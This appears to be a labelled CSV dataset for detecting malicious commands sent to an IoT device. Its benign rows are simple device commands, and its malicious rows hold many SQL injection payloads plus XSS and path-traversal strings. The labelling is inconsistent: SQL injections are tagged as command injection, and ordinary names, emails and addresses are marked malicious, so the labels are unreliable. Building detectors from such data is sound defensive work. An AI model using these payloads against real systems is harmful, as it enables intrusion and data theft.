payload,label,attack_type
"run_cmd, echo ['ok', 'sensor', 'device', 'ready']",benign,norm
"1')) or row(1045,7562)>(select count(*),concat(0x7171706a71,(select (elt(1045=1045,1))),0x717a767a71,floor(rand(0)*2))x from (select 8488 union select 5584 union select 3051 union select 1210)a group by x) and (('mttj' like 'mttj",malicious,cmdi
"run_cmd, ADD 598 292",benign,norm
arquiigo guardiola,malicious,cmd_parse_error
"</title><script>alert(""crosssitescripting"");</script>",malicious,xss
"run_cmd, echo ['report']",benign,norm
-4607'||(select 'wkdg' where 7524=7524 order by 1--,malicious,cmdi
"run_cmd, echo ['report', 'safe', 'esp32']",benign,norm
haroldo,malicious,cmd_parse_error
"run_cmd, ADD 63 154",benign,norm
"run_cmd, echo ['normal', 'esp32']",benign,norm
"start_temp_report, 25",benign,norm
shail@arrsys.mz,malicious,cmd_parse_error
"start_temp_report, 56",benign,norm
"echo, ['safe', 'esp32', 'ok']",benign,norm
castell d'empries,malicious,cmd_parse_error
"run_cmd, ADD 916 588",benign,norm
gould,malicious,cmd_parse_error
1' where 5335=5335;select pg_sleep(5)--,malicious,cmdi
"start_temp_report, 63",benign,norm
"echo, ['safe', 'normal']",benign,norm
nelber,malicious,cmd_parse_error
1';begin dbms_lock.sleep(5); end--,malicious,cmdi
"run_cmd, echo ['world']",benign,norm
"run_cmd, echo ['system', 'esp32', 'sensor']",benign,norm
muntan pros,malicious,cmd_parse_error
mquina,malicious,cmd_parse_error
eguiluz estupia,malicious,cmd_parse_error
"run_cmd, echo ['normal', 'device', 'safe', 'mqtt']",benign,norm
"1'));create or replace function sleep(int) returns int as '/lib/libc.so.6','sleep' language 'c' strict; select sleep(5) and (('uyft'='uyft",malicious,cmdi
"echo, ['device', 'normal', 'payload']",benign,norm
"start_temp_report, 86",benign,norm
"-8580') union all select 3428,3428,3428,3428,3428,3428,3428,3428,3428#",malicious,cmd_parse_error
"start_temp_report, 7",benign,norm
"run_cmd, echo ['hello', 'safe', 'ok']",benign,norm
"echo, ['sensor', 'mqtt', 'report', 'ready']",benign,norm
"1'+(select thmg where 2546=2546 or 1022=(select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5)--",malicious,cmd_parse_error
"-2639"") where 1494=1494 union all select 1494--",malicious,cmd_parse_error
cuartn,malicious,cmd_parse_error
kreuzer@11horas.ag,malicious,cmd_parse_error
nuri,malicious,cmd_parse_error
"1%"" union all select null,null,null,null,null,null#",malicious,cmd_parse_error
sohier,malicious,cmd_parse_error
rajadell,malicious,cmd_parse_error
"echo, ['mqtt']",benign,norm
"run_cmd, ADD 518 673",benign,norm
"run_cmd, echo ['mqtt', 'device']",benign,norm
tenuta,malicious,cmd_parse_error
"1)) as queb where 2449=2449 union all select null,null#",malicious,cmd_parse_error
"echo, ['ok', 'ping', 'iot']",benign,norm
"run_cmd, ADD 841 751",benign,norm
"run_cmd, ADD 923 446",benign,norm
"start_temp_report, 73",benign,norm
"echo, ['ok', 'normal', 'device', 'safe']",benign,norm
"1"")));call regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null) and (((""jcyh""=""jcyh",malicious,cmdi
"run_cmd, ADD 480 183",benign,norm
"echo, ['payload', 'status', 'system', 'data']",benign,norm
-6813))) or 6872=6872 and (((7304=7304,malicious,cmd_parse_error
"run_cmd, echo ['normal', 'ping']",benign,norm
"start_temp_report, 20",benign,norm
"echo, ['sensor']",benign,norm
"start_temp_report, 53",benign,norm
"echo, ['normal', 'sensor']",benign,norm
"calle la paz, 88,",malicious,cmd_parse_error
"echo, ['ok', 'esp32']",benign,norm
"start_temp_report, 108",benign,norm
"run_cmd, ADD 271 945",benign,norm
"run_cmd, ADD 170 662",benign,norm
"1',(select (case when (1902=5536) then 1 else 1902*(select 1902 from master..sysdatabases) end))",malicious,cmd_parse_error
"camino ancho s/n,",malicious,cmd_parse_error
"start_temp_report, 89",benign,norm
"-5160') union all select 8067,8067,8067,8067,8067,8067,8067--",malicious,cmd_parse_error
cobo,malicious,cmd_parse_error
"-3059 or 1570=convert(int,(select char(113)+char(113)+char(112)+char(106)+char(113)+(select (case when (1570=1570) then char(49) else char(48) end))+char(113)+char(122)+char(118)+char(122)+char(113)))",malicious,cmd_parse_error
"run_cmd, ADD 608 734",benign,norm
"run_cmd, echo ['hello', 'system', 'device', 'ping']",benign,norm
"start_temp_report, 102",benign,norm
-2530%' order by 1#,malicious,cmd_parse_error
"run_cmd, ADD 299 243",benign,norm
"echo, ['normal', 'world']",benign,norm
1' where 6035=6035 waitfor delay '0:0:5'--,malicious,cmd_parse_error
"start_temp_report, 87",benign,norm
"run_cmd, echo ['device']",benign,norm
"echo, ['iot', 'ping', 'esp32']",benign,norm
cedo rosa's,malicious,cmd_parse_error
"run_cmd, ADD 748 339",benign,norm
"1"") where 2758=2758 union all select null,null,null,null,null,null,null--",malicious,cmd_parse_error
lebars,malicious,cmd_parse_error
basile@europop.by,malicious,cmd_parse_error
"1))) or 5286=(select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5) and (((1164=1164",malicious,cmd_parse_error
perales salmern,malicious,cmd_parse_error
"start_temp_report, 107",benign,norm
"1%"") and 4241=convert(int,(select char(113)+char(113)+char(112)+char(106)+char(113)+(select (case when (4241=4241) then char(49) else char(48) end))+char(113)+char(122)+char(118)+char(122)+char(113))) and (""%""=""",malicious,cmd_parse_error
-5803) where 8651=8651 or 4493=utl_inaddr.get_host_address(chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (4493=4493) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113))--,malicious,cmdi
"run_cmd, ADD 35 759",benign,norm
miramar,malicious,cmd_parse_error
colodner@proofreader.sj,malicious,cmd_parse_error
47gent1r,malicious,cmd_parse_error
"start_temp_report, 3",benign,norm
"start_temp_report, 2",benign,norm
38888523p,malicious,cmd_parse_error
6718614214297094,malicious,cmd_parse_error
brooking-doolittle@encuentrodominios.lv,malicious,cmd_parse_error
"<bgsound src=""javascript:alert('crosssitescripting');"">",malicious,cmdi
"rio ter, 86, 5?g",malicious,cmd_parse_error
"<xml id=xss src=""http://ha.ckers.org/xsstest.xml"" id=i></xml>",malicious,cmdi
"echo, ['device', 'normal']",benign,norm
octgona,malicious,cmd_parse_error
25260,malicious,cmd_parse_error
"ondulada, 121",malicious,cmd_parse_error
"run_cmd, ADD 86 585",benign,norm
"run_cmd, echo ['status']",benign,norm
"1"" procedure analyse(extractvalue(9627,concat(0x5c,(benchmark(5000000,md5(0x4b774c75))))),1)#",malicious,cmd_parse_error
"1) where 9206=9206 union all select null,null,null,null,null,null#",malicious,cmd_parse_error
"echo, ['world', 'sensor', 'normal']",benign,norm
1')) union all select null#,malicious,cmd_parse_error
nona,malicious,cmd_parse_error
"echo, ['ready', 'ping']",benign,norm
"run_cmd, echo ['device']",benign,norm
lidia,malicious,cmd_parse_error
"start_temp_report, 47",benign,norm
"-3781) union all select 3916,3916,3916--",malicious,cmd_parse_error
"start_temp_report, 100",benign,norm
"start_temp_report, 35",benign,norm
"run_cmd, echo ['normal']",benign,norm
"start_temp_report, 7",benign,norm
"run_cmd, echo ['mqtt']",benign,norm
"run_cmd, ADD 315 435",benign,norm
mino@showcarsmadrid.com.zm,malicious,cmd_parse_error
"echo, ['world']",benign,norm
"run_cmd, ADD 165 593",benign,norm
"run_cmd, ADD 908 390",benign,norm
"start_temp_report, 98",benign,norm
"echo, ['mqtt', 'ready', 'ok', 'sensor']",benign,norm
1'+(select 'iyyv' where 9500=9500 or (select * from (select(sleep(5)))ydpu))+',malicious,cmd_parse_error
"run_cmd, echo ['world', 'payload']",benign,norm
"run_cmd, ADD 529 536",benign,norm
"run_cmd, ADD 306 798",benign,norm
"start_temp_report, 57",benign,norm
"run_cmd, echo ['iot', 'hello']",benign,norm
1')) and 2853=cast((chr(113)||chr(113)||chr(112)||chr(106)||chr(113))||(select (case when (2853=2853) then 1 else 0 end))::text||(chr(113)||chr(122)||chr(118)||chr(122)||chr(113)) as numeric) and (('yhku' like 'yhku,malicious,cmdi
"start_temp_report, 76",benign,norm
"echo, ['safe', 'sensor', 'data']",benign,norm
"echo, ['system', 'iot', 'data']",benign,norm
"calle llansa, s/n, 1a",malicious,cmd_parse_error
"echo, ['ready']",benign,norm
"run_cmd, ADD 551 978",benign,norm
pozzetto@miplat.am,malicious,cmd_parse_error
ammiel,malicious,cmd_parse_error
"1) and extractvalue(7982,concat(0x5c,0x7171706a71,(select (elt(7982=7982,1))),0x717a767a71)) and (5130=5130",malicious,cmd_parse_error
"echo, ['mqtt', 'device']",benign,norm
tybalt,malicious,cmd_parse_error
"run_cmd, echo ['status', 'safe', 'data', 'mqtt']",benign,norm
"run_cmd, echo ['ping', 'hello', 'esp32', 'normal']",benign,norm
"start_temp_report, 117",benign,norm
"start_temp_report, 69",benign,norm
93640511j,malicious,cmd_parse_error
7555972134845296,malicious,cmd_parse_error
"run_cmd, echo ['ready']",benign,norm
fedora,malicious,cmd_parse_error
"start_temp_report, 66",benign,norm
06131,malicious,cmd_parse_error
"echo, ['device', 'world', 'mqtt', 'status']",benign,norm
"1'+(select 'xqpe' where 4020=4020 union all select null,null--",malicious,cmd_parse_error
"echo, ['device', 'ping']",benign,norm
ribot velugo,malicious,cmd_parse_error
"echo, ['sensor', 'mqtt']",benign,norm
88215924e,malicious,cmd_parse_error
"run_cmd, ADD 565 788",benign,norm
"1 where 8389=8389 union all select null,null,null,null,null,null,null,null,null,null#",malicious,cmd_parse_error
tejera,malicious,cmd_parse_error
"start_temp_report, 2",benign,norm
1;begin user_lock.sleep(5); end--,malicious,cmdi
"1%"";select (case when (6276=6276) then 6276 else 6276*(select 6276 from information_schema.character_sets) end)#",malicious,cmdi
5370,malicious,cmd_parse_error
3302117123489448,malicious,cmd_parse_error
"run_cmd, ADD 152 137",benign,norm
"echo, ['mqtt', 'safe']",benign,norm
"run_cmd, ADD 591 131",benign,norm
1' in boolean mode);waitfor delay '0:0:5'--,malicious,cmdi
"start_temp_report, 116",benign,norm
"run_cmd, echo ['ping']",benign,norm
"start_temp_report, 97",benign,norm
"run_cmd, echo ['status', 'device']",benign,norm
chaurett,malicious,cmd_parse_error
"run_cmd, ADD 968 615",benign,norm
zapateo,malicious,cmd_parse_error
"start_temp_report, 23",benign,norm
"1"" where 9669=9669;select sleep(5)--",malicious,cmdi
"echo, ['status', 'report']",benign,norm
"start_temp_report, 45",benign,norm
borguo bartomu,malicious,cmd_parse_error
46660,malicious,cmd_parse_error
63269334z,malicious,cmd_parse_error
geraldina,malicious,cmd_parse_error
"start_temp_report, 26",benign,norm
pangborne@europop.mw,malicious,cmd_parse_error
a0r4g7,malicious,cmd_parse_error
"start_temp_report, 68",benign,norm
caas,malicious,cmd_parse_error
"run_cmd, echo ['esp32', 'mqtt']",benign,norm
esser,malicious,cmd_parse_error
"start_temp_report, 96",benign,norm
"start_temp_report, 111",benign,norm
"echo, ['sensor', 'system', 'hello']",benign,norm
0562626230095582,malicious,cmd_parse_error
62258107m,malicious,cmd_parse_error
-2604)) as sekb where 6897=6897 or 1000=7683,malicious,cmd_parse_error
"run_cmd, echo ['mqtt', 'ping', 'status']",benign,norm
"echo, ['data', 'status', 'ping']",benign,norm
"1'))) or 8315=(select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3) and ((('raus'='raus",malicious,cmd_parse_error
pensosa,malicious,cmd_parse_error
"1')) and 4241=convert(int,(select char(113)+char(113)+char(112)+char(106)+char(113)+(select (case when (4241=4241) then char(49) else char(48) end))+char(113)+char(122)+char(118)+char(122)+char(113))) and (('wzrj'='wzrj",malicious,cmd_parse_error
rosendal,malicious,cmd_parse_error
matungo,malicious,cmd_parse_error
orea,malicious,cmd_parse_error
6596687598913643,malicious,cmd_parse_error
"echo, ['device', 'esp32', 'status', 'mqtt']",benign,norm
"run_cmd, ADD 885 330",benign,norm
"1"");select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 and (""ihqf""=""ihqf",malicious,cmdi
"run_cmd, echo ['system']",benign,norm
"1');select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 and ('vfxg' like 'vfxg",malicious,cmdi
11696227z,malicious,cmd_parse_error
586,malicious,cmd_parse_error
"echo, ['hello', 'system', 'world']",benign,norm
"start_temp_report, 88",benign,norm
"1"" (select (case when (4587=4587) then regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null) else char(76)||char(65)||char(102)||char(72) end) from (values(0)))",malicious,cmdi
0932689894259111,malicious,cmd_parse_error
"run_cmd, echo ['system']",benign,norm
"start_temp_report, 15",benign,norm
"1%""));select (case when (1499=4923) then 1499 else 1/(select 0) end)--",malicious,cmdi
"echo, ['mqtt', 'iot', 'esp32', 'normal']",benign,norm
"1""))) and 4386=utl_inaddr.get_host_address(chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (4386=4386) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)) and (((""msjh"" like ""msjh",malicious,cmdi
"echo, ['esp32', 'system', 'ready', 'device']",benign,norm
"1"")))(select (case when (4587=4587) then regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null) else char(76)||char(65)||char(102)||char(72) end) from (values(0))) and (((""kfdh"" like ""kfdh",malicious,cmdi
"-3270%' or elt(9404=3498,3498) and '%'='",malicious,cmd_parse_error
saldas,malicious,cmd_parse_error
"start_temp_report, 91",benign,norm
"run_cmd, ADD 849 829",benign,norm
"echo, ['ok', 'report']",benign,norm
"run_cmd, echo ['ping']",benign,norm
"1%"";select pg_sleep(5) and ""%""=""",malicious,cmdi
"labiano, s/n 7?a",malicious,cmd_parse_error
"start_temp_report, 56",benign,norm
"start_temp_report, 6",benign,norm
"run_cmd, ADD 206 129",benign,norm
laumann mancha,malicious,cmd_parse_error
"c/ poeta bernardo de la torre 10,",malicious,cmd_parse_error
"run_cmd, ADD 561 250",benign,norm
"calle mateo lopez 62,",malicious,cmd_parse_error
74566884x,malicious,cmd_parse_error
"echo, ['data']",benign,norm
/................................................................................{file},malicious,cmd_parse_error
"-3775') as rqet where 7092=7092 or elt(1032=1032,3623)--",malicious,cmd_parse_error
brandsen,malicious,cmd_parse_error
"start_temp_report, 109",benign,norm
"start_temp_report, 109",benign,norm
-8010' or (2225=8491)*8491 and 'eipf'='eipf,malicious,cmd_parse_error
"echo, ['status', 'system', 'payload']",benign,norm
"start_temp_report, 29",benign,norm
ribamontn al mar,malicious,cmd_parse_error
"1))) union all select null,null,null,null,null,null,null,null,null#",malicious,cmd_parse_error
"1')) as jxvv where 6593=6593 or elt(6272=6272,sleep(5))--",malicious,cmd_parse_error
"1"") as cnrh where 8524=8524 and 3824=benchmark(5000000,md5(0x76555642))--",malicious,cmd_parse_error
"1'));select benchmark(5000000,md5(0x4c4d6142)) and (('fegp'='fegp",malicious,cmdi
milton@diagnosticoradiologico.asia,malicious,cmd_parse_error
"run_cmd, ADD 377 653",benign,norm
"run_cmd, echo ['world']",benign,norm
costringir,malicious,cmd_parse_error
/................{file},malicious,cmd_parse_error
florin,malicious,cmd_parse_error
"1)) as ynzg where 1926=1926 or (select 9173 from(select count(*),concat(0x7171706a71,(select (elt(9173=9173,1))),0x717a767a71,floor(rand(0)*2))x from information_schema.character_sets group by x)a)--",malicious,cmd_parse_error
"run_cmd, echo ['world', 'normal', 'device', 'payload']",benign,norm
"run_cmd, echo ['report', 'sensor', 'system', 'ping']",benign,norm
holoubek@hojainformativas.ua,malicious,cmd_parse_error
novalbos illarraga,malicious,cmd_parse_error
"echo, ['sensor']",benign,norm
"run_cmd, echo ['normal', 'ready', 'report', 'hello']",benign,norm
"-3628"" or 1570=convert(int,(select char(113)+char(113)+char(112)+char(106)+char(113)+(select (case when (1570=1570) then char(49) else char(48) end))+char(113)+char(122)+char(118)+char(122)+char(113)))",malicious,cmd_parse_error
.lapidosa,malicious,cmd_parse_error
"echo, ['system', 'ready', 'status']",benign,norm
24443,malicious,cmd_parse_error
"run_cmd, ADD 579 51",benign,norm
"-7001'+(select slav where 9321=9321 union all select 9321,9321,9321,9321,9321,9321,9321,9321,9321--",malicious,cmd_parse_error
cardona@interanuncios.mv,malicious,cmd_parse_error
"run_cmd, echo ['iot', 'ok']",benign,norm
"run_cmd, echo ['hello']",benign,norm
"echo, ['sensor', 'system', 'payload']",benign,norm
"start_temp_report, 56",benign,norm
12370442f,malicious,cmd_parse_error
clar degomis,malicious,cmd_parse_error
"run_cmd, echo ['mqtt', 'ok']",benign,norm
"run_cmd, echo ['ready', 'normal', 'device', 'report']",benign,norm
"1"")) and 6486=3843 and ((""fbka"" like ""fbka",malicious,cmd_parse_error
m974or5s2,malicious,cmd_parse_error
"run_cmd, ADD 523 296",benign,norm
"1)) or 8421=(select count(*) from generate_series(1,5000000)) and ((4277=4277",malicious,cmd_parse_error
"1%'))) union all select null,null,null,null,null,null,null#",malicious,cmd_parse_error
beomsahn,malicious,cmd_parse_error
"1%""));select pg_sleep(5) and ((""%""=""",malicious,cmdi
"run_cmd, ADD 856 796",benign,norm
"run_cmd, echo ['system', 'hello']",benign,norm
"-4822"" or 4493=utl_inaddr.get_host_address(chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (4493=4493) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)) and ""owbp""=""owbp",malicious,cmdi
"start_temp_report, 59",benign,norm
"conde de olocau, s/n, 3g",malicious,cmd_parse_error
"run_cmd, ADD 434 834",benign,norm
"1 and 2716=(select count(*) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7)--",malicious,cmd_parse_error
"run_cmd, ADD 522 806",benign,norm
"1;select * from generate_series(3341,3341,case when (3341=3072) then 1 else 0 end) limit 1--",malicious,cmdi
"echo, ['status', 'iot', 'ok', 'normal']",benign,norm
"1%"") or (select 9173 from(select count(*),concat(0x7171706a71,(select (elt(9173=9173,1))),0x717a767a71,floor(rand(0)*2))x from information_schema.character_sets group by x)a) and (""%""=""",malicious,cmd_parse_error
"run_cmd, ADD 308 93",benign,norm
"start_temp_report, 95",benign,norm
"1' where 4945=4945;call regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null)--",malicious,cmdi
ballobar,malicious,cmd_parse_error
"run_cmd, echo ['status', 'iot', 'hello']",benign,norm
0utaperc09,malicious,cmd_parse_error
"run_cmd, ADD 765 365",benign,norm
"1"");select case when 1892=3646 then 1 else null end--",malicious,cmdi
"run_cmd, ADD 25 842",benign,norm
"1')));select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 and ((('pshn' like 'pshn",malicious,cmdi
"echo, ['ping', 'sensor']",benign,norm
"start_temp_report, 79",benign,norm
isasi urquiza,malicious,cmd_parse_error
6038552435376719,malicious,cmd_parse_error
"run_cmd, echo ['ready', 'sensor']",benign,norm
"echo, ['report']",benign,norm
93398116s,malicious,cmd_parse_error
"run_cmd, ADD 585 965",benign,norm
vacher,malicious,cmd_parse_error
"1"")) or extractvalue(1297,concat(0x5c,0x7171706a71,(select (elt(1297=1297,1))),0x717a767a71)) and ((""pebw"" like ""pebw",malicious,cmd_parse_error
"echo, ['report', 'status', 'sensor']",benign,norm
"1'))) or (select 2*(if((select * from (select concat(0x7171706a71,(select (elt(8113=8113,1))),0x717a767a71,0x78))s), 8446744073709551610, 8446744073709551610))) and ((('qpuy'='qpuy",malicious,cmd_parse_error
"run_cmd, echo ['report', 'system']",benign,norm
"1') or 8466=benchmark(5000000,md5(0x694a4745)) and ('nond'='nond",malicious,cmd_parse_error
tolera9lemen8e,malicious,cmd_parse_error
"run_cmd, echo ['iot', 'device', 'system', 'mqtt']",benign,norm
"start_temp_report, 38",benign,norm
"start_temp_report, 16",benign,norm
v9lenc8an3sm9,malicious,cmd_parse_error
alvean,malicious,cmd_parse_error
farmacoplica,malicious,cmd_parse_error
17923027r,malicious,cmd_parse_error
crespo bullones,malicious,cmd_parse_error
"run_cmd, ADD 513 589",benign,norm
03759,malicious,cmd_parse_error
"-1559 union all select 3985,3985,3985,3985#",malicious,cmd_parse_error
"run_cmd, echo ['ok']",benign,norm
"1')) and 8189=(select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3)--",malicious,cmd_parse_error
"run_cmd, echo ['iot', 'hello', 'ping', 'report']",benign,norm
"echo, ['esp32', 'mqtt', 'report']",benign,norm
"start_temp_report, 102",benign,norm
"echo, ['sensor', 'ping']",benign,norm
4978848315399103,malicious,cmd_parse_error
"run_cmd, ADD 63 177",benign,norm
"echo, ['iot', 'payload', 'data', 'sensor']",benign,norm
"run_cmd, echo ['device']",benign,norm
3244,malicious,cmd_parse_error
e6749l178e3a,malicious,cmd_parse_error
martn miguel,malicious,cmd_parse_error
"1)) and row(6237,7469)>(select count(*),concat(0x7171706a71,(select (elt(6237=6237,1))),0x717a767a71,floor(rand(0)*2))x from (select 5192 union select 3785 union select 3931 union select 7158)a group by x) and ((9325=9325",malicious,cmdi
"echo, ['sensor', 'ok', 'iot', 'safe']",benign,norm
1902,malicious,cmd_parse_error
"run_cmd, ADD 774 291",benign,norm
"run_cmd, echo ['sensor', 'report']",benign,norm
bossert,malicious,cmd_parse_error
......................../windows/win.ini,malicious,cmd_parse_error
"run_cmd, ADD 289 357",benign,norm
"echo, ['iot', 'normal', 'safe']",benign,norm
"run_cmd, ADD 713 785",benign,norm
"run_cmd, ADD 824 312",benign,norm
"run_cmd, ADD 575 833",benign,norm
9521913109769940,malicious,cmd_parse_error
"1') and row(6237,7469)>(select count(*),concat(0x7171706a71,(select (elt(6237=6237,1))),0x717a767a71,floor(rand(0)*2))x from (select 5192 union select 3785 union select 3931 union select 7158)a group by x)",malicious,cmdi
"run_cmd, echo ['world']",benign,norm
"start_temp_report, 117",benign,norm
"run_cmd, ADD 345 599",benign,norm
ntpadmin,malicious,cmd_parse_error
"echo, ['ready', 'hello', 'device', 'mqtt']",benign,norm
"run_cmd, ADD 178 594",benign,norm
68822552c,malicious,cmd_parse_error
blasco rossetti,malicious,cmd_parse_error
"run_cmd, ADD 568 216",benign,norm
"echo, ['data']",benign,norm
niemyska@inversioneolica.lt,malicious,cmd_parse_error
inquisicin,malicious,cmd_parse_error
"1') and make_set(8403=8403,8899) and ('dhoo' like 'dhoo",malicious,cmd_parse_error
vilagarca de arousa,malicious,cmd_parse_error
"run_cmd, echo ['iot', 'sensor', 'ping', 'safe']",benign,norm
fargues canivilo,malicious,cmd_parse_error
"run_cmd, echo ['report', 'esp32', 'safe', 'mqtt']",benign,norm
-8071)) or 9160=4253,malicious,cmd_parse_error
"run_cmd, echo ['normal']",benign,norm
dantas.pellegrim4@nanotecnologo.kr,malicious,cmd_parse_error
"run_cmd, ADD 757 503",benign,norm
"1"")));call regexp_substring(repeat(right(char(3702),0),500000000),null) and (((""xxug""=""xxug",malicious,cmdi
"echo, ['device']",benign,norm
jurez,malicious,cmd_parse_error
0n9ped7,malicious,cmd_parse_error
"start_temp_report, 109",benign,norm
ordezanka@arroyo-molinos.dj,malicious,cmd_parse_error
miramon@logiteclines.rs,malicious,cmd_parse_error
"run_cmd, echo ['data', 'mqtt', 'payload', 'report']",benign,norm
"run_cmd, ADD 403 816",benign,norm
116,malicious,cmd_parse_error
"run_cmd, echo ['device']",benign,norm
"run_cmd, echo ['esp32', 'normal']",benign,norm
"start_temp_report, 45",benign,norm
"gregoria hernandez 67, 13g",malicious,cmd_parse_error
"start_temp_report, 43",benign,norm
34120,malicious,cmd_parse_error
"1%') union all select null,null,null,null,null,null,null,null--",malicious,cmd_parse_error
lesire@masqueclases.gn,malicious,cmd_parse_error
troguet,malicious,cmd_parse_error
7965,malicious,cmd_parse_error
"1')) union all select null,null,null,null,null,null,null,null--",malicious,cmd_parse_error
"run_cmd, ADD 882 834",benign,norm
"run_cmd, ADD 388 414",benign,norm
"1') as wtfo where 5666=5666 union all select null,null,null,null--",malicious,cmd_parse_error
1';select case when 7717=7717 then 1 else null end--,malicious,cmdi
"run_cmd, ADD 702 495",benign,norm
"run_cmd, echo ['ping', 'hello', 'safe']",benign,norm
"echo, ['report', 'sensor']",benign,norm
"run_cmd, ADD 695 972",benign,norm
"run_cmd, echo ['ping', 'device', 'ok']",benign,norm
qerimi@graficascamp.bt,malicious,cmd_parse_error
"start_temp_report, 112",benign,norm
"1""))(select (case when (4587=4587) then regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null) else char(76)||char(65)||char(102)||char(72) end) from (values(0))) and ((""ffcf"" like ""ffcf",malicious,cmdi
soez,malicious,cmd_parse_error
"1"";iif(2084=5671,1,1/0)",malicious,cmdi
clavering@pinturasultravioleta.pro,malicious,cmd_parse_error
tetreaul7,malicious,cmd_parse_error
3218,malicious,cmd_parse_error
heli,malicious,cmd_parse_error
monitor,malicious,cmd_parse_error
"1"") where 9285=9285 and 8506=8343#",malicious,cmd_parse_error
"-9959"") or 4747=dbms_utility.sqlid_to_sqlhash((chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (4747=4747) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113))) and (""vcwc""=""vcwc",malicious,cmdi
-3867%') or 3084=5633 and ('%'=',malicious,cmd_parse_error
"-7981%"" union all select 4532,4532,4532,4532,4532,4532,4532#",malicious,cmd_parse_error
sempronia,malicious,cmd_parse_error
"1;select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5--",malicious,cmdi
"run_cmd, ADD 857 763",benign,norm
katia,malicious,cmd_parse_error
0e8v88e,malicious,cmd_parse_error
"1)) as cvid where 4381=4381 union all select null,null--",malicious,cmd_parse_error
"run_cmd, ADD 403 647",benign,norm
"echo, ['status']",benign,norm
von_semm,malicious,cmd_parse_error
angele6@juegossonic.com.eh,malicious,cmd_parse_error
7875,malicious,cmd_parse_error
"run_cmd, ADD 940 270",benign,norm
"-8042) as zhoq where 2120=2120 union all select 2120,2120,2120,2120,2120,2120,2120,2120,2120,2120--",malicious,cmd_parse_error
-6079))) or 4747=dbms_utility.sqlid_to_sqlhash((chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (4747=4747) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113))) and (((8708=8708,malicious,cmdi
"-6636'))) or elt(1032=1032,3623) and ((('kgip'='kgip",malicious,cmd_parse_error
1)) and (4169=9887)*9887 and ((1137=1137,malicious,cmd_parse_error
"run_cmd, ADD 275 356",benign,norm
"start_temp_report, 82",benign,norm
"1')) or 8315=(select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3) and (('dkra' like 'dkra",malicious,cmd_parse_error
"run_cmd, ADD 511 530",benign,norm
rozele,malicious,cmd_parse_error
26288,malicious,cmd_parse_error
5046,malicious,cmd_parse_error
"echo, ['ok', 'normal', 'mqtt']",benign,norm
sergyl@intercambiodeenlaces.gh,malicious,cmd_parse_error
"start_temp_report, 117",benign,norm
-6036))) or 3440=cast((chr(113)||chr(113)||chr(112)||chr(106)||chr(113))||(select (case when (3440=3440) then 1 else 0 end))::text||(chr(113)||chr(122)||chr(118)||chr(122)||chr(113)) as numeric) and (((6723=6723,malicious,cmdi
norberto,malicious,cmd_parse_error
"run_cmd, ADD 525 426",benign,norm
"run_cmd, ADD 457 33",benign,norm
"run_cmd, ADD 470 2",benign,norm
sant mateu de bages,malicious,cmd_parse_error
